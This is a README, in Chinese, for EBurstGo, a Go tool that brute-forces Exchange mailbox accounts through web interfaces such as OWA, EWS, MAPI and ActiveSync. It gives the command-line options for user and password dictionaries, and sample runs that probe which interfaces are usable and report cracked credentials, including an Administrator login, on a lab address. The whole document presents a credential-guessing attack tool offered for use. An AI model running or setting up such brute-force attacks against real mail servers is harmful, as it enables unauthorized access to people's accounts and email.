# EBurstGo

利用 Exchange 服务器 Web 接口爆破邮箱账户

参考 [grayddq/EBurst](https://github.com/grayddq/EBurst) 项目利用 Go 语言进行重构

支持接口

```shell
/autodiscover
/owa/auth.owa # OWA & ECP
/ews
/mapi
/oab
/rpc
/Microsoft-Server-ActiveSync
/powershell
```

## Usage

usage

```shell
Usage of ./EBurstGo:
  -check
    	检查目标 Exchange 可用接口
  -debug
    	显示 Debug 信息
  -delay int
    	请求延时
  -domain string
    	AD 域名
  -mode string
    	指定 Exchange Web 接口
  -pass string
    	密码字典
  -thread int
    	协程数量 (default 2)
  -url string
    	Exchange 服务器地址
  -user string
    	用户名字典
  -verbose
    	显示详细信息
```

check

```shell
$ ./EBurstGo -url https://192.168.30.11 -check
[+] 存在 owa 接口 (/owa/auth.owa), 可以爆破
[+] 存在 powershell 接口 (/powershell), 可以爆破
[+] 存在 ecp 接口 (/owa/auth.owa), 可以爆破
[+] 存在 autodiscover 接口 (/autodiscover), 可以爆破
[+] 存在 mapi 接口 (/mapi), 可以爆破
[+] 存在 activesync 接口 (/Microsoft-Server-ActiveSync), 可以爆破
[+] 存在 oab 接口 (/oab), 可以爆破
[+] 存在 ews 接口 (/ews), 可以爆破
[+] 存在 rpc 接口 (/rpc), 可以爆破
```

brute

```shell
$ ./EBurstGo -url https://192.168.30.11 -domain hack-my.com -user users.txt -pass pass.txt -mode ews
[*] 使用 ews 接口爆破: https://192.168.30.11
[+] 成功: Administrator:abcd1234!@#$
[+] 成功: Alice:Alice123!
[+] 成功: Bob:Bob123!
[+] 成功: Marry:Marry123!
[*] 耗时: 4.40084275s
```

已知 bug:
- 当协程数量过大时, 部分利用 NTLM 进行身份认证的接口可能出现漏报
- 在使用 ActiveSync 接口进行爆破时, 如果凭据正确, 服务器会在大约 20s 之后响应, 期间会阻塞当前协程 (不过好像是 ActiveSync 本身的特性)
- `/rpc` 和 `/oab` 接口存在问题, 待解决
- `/powershell` 接口 (Kerberos 认证) 待支持